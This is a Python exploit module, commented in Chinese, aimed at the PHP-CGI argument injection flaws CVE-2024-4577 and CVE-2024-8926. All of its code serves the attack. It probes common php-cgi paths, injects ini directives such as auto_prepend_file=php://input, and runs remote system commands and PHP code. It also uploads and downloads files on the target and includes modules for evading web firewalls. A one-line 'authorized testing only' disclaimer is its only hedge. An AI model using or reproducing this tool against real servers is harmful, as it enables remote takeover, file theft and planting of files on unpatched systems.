# -*- coding: utf-8 -*-
"""PHP-CGI 参数注入（CVE-2024-4577 / CVE-2024-8926）核心利用模块。

自包含实现：不依赖 rich / banner / tor，只依赖 requests。
封装了 old/exploit.py 的漏洞探测、命令执行、文件上传/下载、WAF bypass 逻辑。

⚠️ 仅供授权测试（企业红队、CTF、安全研究）。请勿用于未授权系统。
"""

import base64
import random
import re
import string

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Payload 常量（与 old/exploit.py 保持一致）
# ---------------------------------------------------------------------------

# 单个参数注入元素（key -> 已 URL 编码的 PHP ini 指令）
PAYLOAD_ELEMENTS = {
    1: "disable_functions%3d%26",
    2: "disable_classes%3d%26",
    3: "open_basedir%3d",
    4: "cgi.force_redirect%3d0",
    5: "cgi.redirect_status_env",
    6: "allow_url_include%3d1",
    7: "allow_url_fopen%3d1",
    8: "auto_prepend_file%3dphp://input",
    9: "file_uploads%3d1",
    10: "upload_max_filesize%3d0",
    11: "log_errors%3d0",
    12: "post_max_size%3d0",
    13: "memory_limit%3d%2B1",
    14: "enable_dl%3d1",
    15: "max_execution_time%3d0",
    16: "short_open_tag%3d1",
    17: "max_input_time%3d0",
    18: "expose_php%3d1",
}

# 预设组合
PAYLOAD_COMBINATIONS = {
    "1": [1, 2, 3, 4, 5, 6, 7, 8],
    "2": [1, 4, 5, 6, 8],
    "3": [4, 6, 8],
}

# 每个 CVE 的前缀
CVE_PREFIXES = {
    "CVE-2024-4577": "%ADd",
    "CVE-2024-8926": "%a8-d%a8",
}

# 常见 CGI 路径字典
CGI_POINTS = [
    "/php-cgi/php-cgi.exe",
    "/cgi-bin/php-cgi.exe",
    "/php-cgi.exe",
    "/cgi/php-cgi.exe",
    "/php.exe",
    "/cgi-bin/php.exe",
    "/cgi/php.exe",
    "/index.php",
    "/",
]

TEST_MARKER = "TEST_VULNTEST_CVE-2024-4577"
TEST_PHP = f"<?php echo '{TEST_MARKER}'; die(); ?>"

# ---------------------------------------------------------------------------
# 基础工具
# ---------------------------------------------------------------------------


def normalize_target(target: str) -> str:
    """把 IP / IP:port / 域名 规范化为完整 URL（默认 http）。"""
    t = (target or "").strip()
    if not t:
        raise ValueError("target 不可为空")
    if not re.match(r"^https?://", t, re.IGNORECASE):
        t = "http://" + t
    return t.rstrip("/")


def build_payload(payload_group: str, cve_id: str) -> str:
    if payload_group not in PAYLOAD_COMBINATIONS:
        raise ValueError(
            f"未知 payload_group: {payload_group!r}，可选 {list(PAYLOAD_COMBINATIONS)}"
        )
    if cve_id not in CVE_PREFIXES:
        raise ValueError(f"未知 cve_id: {cve_id!r}，可选 {list(CVE_PREFIXES)}")
    prefix = CVE_PREFIXES[cve_id]
    elements = PAYLOAD_COMBINATIONS[payload_group]
    return "+".join(f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in elements)


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def build_php_command(cmd: str) -> str:
    """用 base64 包裹命令，避免引号/特殊字符破坏 PHP 语法。"""
    return f"<?php system(base64_decode('{_b64(cmd)}')); die(); ?>"


def build_php_custom(php_code: str) -> str:
    return f"<?php {php_code}\ndie(); ?>"


def build_php_upload(remote_path: str, content_bytes: bytes) -> str:
    remote = remote_path.replace("\\", "/").replace("'", "\\'")
    return (
        f"<?php file_put_contents('{remote}', "
        f"base64_decode('{base64.b64encode(content_bytes).decode('ascii')}')); "
        f"echo 'OK'; die(); ?>"
    )


def build_php_download(remote_path: str) -> str:
    remote = remote_path.replace("'", "\\'")
    return f"<?php echo file_get_contents('{remote}'); die(); ?>"


def build_php_docroot() -> str:
    return "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"


# ---------------------------------------------------------------------------
# Bypass 模块（自包含重写，逻辑与 old/bypass_modules 一致）
# ---------------------------------------------------------------------------


def _t_append_adad(req, attempt=0):
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    req["payload"] += f"+%AD%AD+{suffix}"
    return req


def _t_cgipath_garbage(req, attempt=0):
    if req.get("cgipoint") and not req["cgipoint"].endswith("/%81%F5%81%F5/"):
        req["cgipoint"] += "/%81%F5%81%F5/" if req["cgipoint"].endswith("/") else "/%81%F5%81%F5/"
    return req


def _t_cgi_case_mixer(req, attempt=0):
    cgipoint = req.get("cgipoint", "")
    if not cgipoint:
        return req
    if "/" in cgipoint:
        dir_name, file_name = cgipoint.rsplit("/", 1)
        mixed = "".join(
            ch.upper() if random.random() < 0.5 else ch.lower() for ch in file_name
        )
        req["cgipoint"] = f"{dir_name}/{mixed}"
    else:
        req["cgipoint"] = "".join(
            ch.upper() if random.random() < 0.5 else ch.lower() for ch in cgipoint
        )
    return req


def _extract_prefix(payload: str) -> str:
    m = re.search(r"(%[a-zA-Z0-9%-]+)\+", payload)
    return m.group(1) if m else "%ADd"


def _split_payload(payload: str, prefix: str):
    parts = payload.split("+")
    chunks = []
    i = 0
    while i < len(parts) - 1:
        if parts[i] == prefix:
            chunks.append(f"{parts[i]}+{parts[i + 1]}")
            i += 2
        else:
            i += 1
    return chunks


def _t_insert_dummy(req, attempt=0):
    payload = req.get("payload", "")
    if not payload:
        return req
    prefix = _extract_prefix(payload)
    chunks = _split_payload(payload, prefix)
    if not chunks:
        return req
    fake = f"{prefix}+{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}%3d1"
    idx = random.randrange(0, len(chunks) + 1)
    new_chunks = chunks.copy()
    new_chunks.insert(idx, fake)
    req["payload"] = "+".join(new_chunks)
    return req


def _t_payload_shuffle(req, attempt=0):
    payload = req.get("payload", "")
    if not payload:
        return req
    parts = payload.split("+")
    chunks = [
        f"{parts[i]}+{parts[i + 1]}" for i in range(0, len(parts) - 1, 2)
    ]
    if not chunks:
        return req
    random.shuffle(chunks)
    req["payload"] = "+".join(chunks)
    return req


def _t_phpfilter_wrap(req, attempt=0):
    payload = req.get("payload", "")
    if "php://input" in payload:
        payload = payload.replace(
            "php://input",
            "%22php://filter/convert.base64-decode/resource%3Ddata://text/plain,PD9waHAgaW5jbHVkZSgncGhwOi8vaW5wdXQnKTsgPz4%3D%22",
        )
        req["payload"] = payload
    return req


def _t_phpinput_to_data(req, attempt=0):
    payload = req.get("payload", "")
    if "php://input" in payload:
        payload = payload.replace(
            "php://input",
            "%22data://text/plain;base64,PD9waHAgaW5jbHVkZSgncGhwOi8vaW5wdXQnKTsgPz4%3D%22",
        )
        req["payload"] = payload
    return req


_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


def _t_random_useragent(req, attempt=0):
    req.setdefault("headers", {})["User-Agent"] = random.choice(_USER_AGENTS)
    return req


def _t_redirect_status(req, attempt=0):
    req.setdefault("headers", {})["Redirect-status"] = "1"
    return req


def _t_xff_ip_bypass(req, attempt=0):
    h = req.setdefault("headers", {})
    h["X-Forwarded-For"] = "127.0.0.1"
    h["X-Client-IP"] = "127.0.0.1"
    h["X-Real-IP"] = "127.0.0.1"
    return req


# name -> (description, func)
BYPASS_MODULES = {
    "append_adad": ("在 payload 末尾追加 %AD%AD + 随机字符", _t_append_adad),
    "cgipath_garbage": ("在 CGI 路径末尾追加垃圾 %81%F5%81%F5/", _t_cgipath_garbage),
    "cgi_case_mixer": ("随机大小写混合 CGI 文件名", _t_cgi_case_mixer),
    "insert_dummy": ("在 payload 中插入随机假参数", _t_insert_dummy),
    "payload_shuffle": ("打乱 payload 参数顺序", _t_payload_shuffle),
    "phpfilter_wrap": ("php://input 替换为 php://filter 包装", _t_phpfilter_wrap),
    "phpinput_to_data": ("php://input 替换为 data:// 包装", _t_phpinput_to_data),
    "random_useragent": ("随机 User-Agent 绕过 WAF/CDN", _t_random_useragent),
    "redirect_status": ("添加 Redirect-status: 1 头", _t_redirect_status),
    "xff_ip_bypass": ("伪造 XFF/X-Client-IP/X-Real-IP=127.0.0.1", _t_xff_ip_bypass),
}


def apply_bypass(req: dict, module_names, attempt: int = 0) -> dict:
    if not module_names:
        return req
    req = dict(req)
    req.setdefault("headers", {})
    req["headers"] = dict(req["headers"])
    req["attempt"] = attempt
    for name in module_names:
        if name not in BYPASS_MODULES:
            raise ValueError(
                f"未知 bypass 模块: {name!r}，可选 {list(BYPASS_MODULES)}"
            )
        req = BYPASS_MODULES[name][1](req, attempt)
    return req


# ---------------------------------------------------------------------------
# 请求发送
# ---------------------------------------------------------------------------


def _decode_body(resp) -> str:
    content = resp.content
    for enc in ("utf-8", "gbk", "big5"):
        try:
            return content.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return content.decode("utf-8", errors="replace")


def send_request(
    target: str,
    cgipoint: str,
    payload: str,
    php_body: str,
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
    attempt: int = 0,
):
    req = {
        "url": target,
        "cgipoint": cgipoint,
        "payload": payload,
        "headers": {},
        "post_data": php_body,
        "cve_id": cve_id,
    }
    req = apply_bypass(req, bypass_modules, attempt)
    url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
    data = req["post_data"]
    if isinstance(data, str):
        data = data.encode("utf-8")
    resp = requests.post(
        url, data=data, headers=req.get("headers") or {}, verify=False, timeout=timeout
    )
    return resp, url


# ---------------------------------------------------------------------------
# 高层操作
# ---------------------------------------------------------------------------


def scan(
    target: str,
    cgipoints=None,
    payload_group: str = "1",
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
    retries: int = 1,
):
    """探测 PHP-CGI 参数注入点，返回第一个命中的 (cgipoint, payload_key, url)。"""
    target = normalize_target(target)
    cgi_list = list(cgipoints) if cgipoints else list(CGI_POINTS)
    payload = build_payload(payload_group, cve_id)

    for attempt in range(max(1, retries)):
        for ep in cgi_list:
            try:
                resp, url = send_request(
                    target, ep, payload, TEST_PHP, cve_id, bypass_modules, timeout, attempt
                )
                body = _decode_body(resp)
                if TEST_MARKER in body:
                    return {
                        "found": True,
                        "cgipoint": ep,
                        "cve_id": cve_id,
                        "payload_group": payload_group,
                        "url": url,
                        "probe": body[:500],
                    }
            except Exception as e:
                continue

    return {"found": False, "target": target}


def _ensure_cgipoint(target, cgipoint, payload_group, cve_id, bypass_modules, timeout):
    """若未指定注入点，则自动扫描；失败抛 ValueError。"""
    if cgipoint:
        return cgipoint
    r = scan(target, None, payload_group, cve_id, bypass_modules, timeout, retries=1)
    if not r.get("found"):
        raise ValueError(f"未在 {target} 找到 PHP-CGI 注入点（可先用 phpcgi_scan 探测）")
    return r["cgipoint"]


def exec_command(
    target: str,
    command: str,
    cgipoint=None,
    payload_group: str = "1",
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
):
    target = normalize_target(target)
    cgipoint = _ensure_cgipoint(target, cgipoint, payload_group, cve_id, bypass_modules, timeout)
    payload = build_payload(payload_group, cve_id)
    php = build_php_command(command)
    resp, url = send_request(target, cgipoint, payload, php, cve_id, bypass_modules, timeout, 0)
    return {
        "success": resp.status_code == 200,
        "status_code": resp.status_code,
        "command": command,
        "cgipoint": cgipoint,
        "url": url,
        "output": _decode_body(resp),
    }


def exec_php(
    target: str,
    php_code: str,
    cgipoint=None,
    payload_group: str = "1",
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
):
    target = normalize_target(target)
    cgipoint = _ensure_cgipoint(target, cgipoint, payload_group, cve_id, bypass_modules, timeout)
    payload = build_payload(payload_group, cve_id)
    php = build_php_custom(php_code)
    resp, url = send_request(target, cgipoint, payload, php, cve_id, bypass_modules, timeout, 0)
    return {
        "success": resp.status_code == 200,
        "status_code": resp.status_code,
        "cgipoint": cgipoint,
        "url": url,
        "output": _decode_body(resp),
    }


def upload(
    target: str,
    remote_path: str,
    content: str,
    cgipoint=None,
    payload_group: str = "1",
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
):
    target = normalize_target(target)
    cgipoint = _ensure_cgipoint(target, cgipoint, payload_group, cve_id, bypass_modules, timeout)
    payload = build_payload(payload_group, cve_id)
    php = build_php_upload(remote_path, content.encode("utf-8"))
    resp, url = send_request(target, cgipoint, payload, php, cve_id, bypass_modules, timeout, 0)
    body = _decode_body(resp)
    return {
        "success": resp.status_code == 200 and "OK" in body,
        "status_code": resp.status_code,
        "remote_path": remote_path,
        "cgipoint": cgipoint,
        "url": url,
        "output": body,
    }


def download(
    target: str,
    remote_path: str,
    cgipoint=None,
    payload_group: str = "1",
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
):
    target = normalize_target(target)
    cgipoint = _ensure_cgipoint(target, cgipoint, payload_group, cve_id, bypass_modules, timeout)
    payload = build_payload(payload_group, cve_id)
    php = build_php_download(remote_path)
    resp, url = send_request(target, cgipoint, payload, php, cve_id, bypass_modules, timeout, 0)
    return {
        "success": resp.status_code == 200,
        "status_code": resp.status_code,
        "remote_path": remote_path,
        "cgipoint": cgipoint,
        "url": url,
        "output": _decode_body(resp),
    }


def docroot(
    target: str,
    cgipoint=None,
    payload_group: str = "1",
    cve_id: str = "CVE-2024-4577",
    bypass_modules=None,
    timeout: int = 10,
):
    target = normalize_target(target)
    cgipoint = _ensure_cgipoint(target, cgipoint, payload_group, cve_id, bypass_modules, timeout)
    payload = build_payload(payload_group, cve_id)
    php = build_php_docroot()
    resp, url = send_request(target, cgipoint, payload, php, cve_id, bypass_modules, timeout, 0)
    return {
        "success": resp.status_code == 200,
        "status_code": resp.status_code,
        "cgipoint": cgipoint,
        "url": url,
        "output": _decode_body(resp),
    }
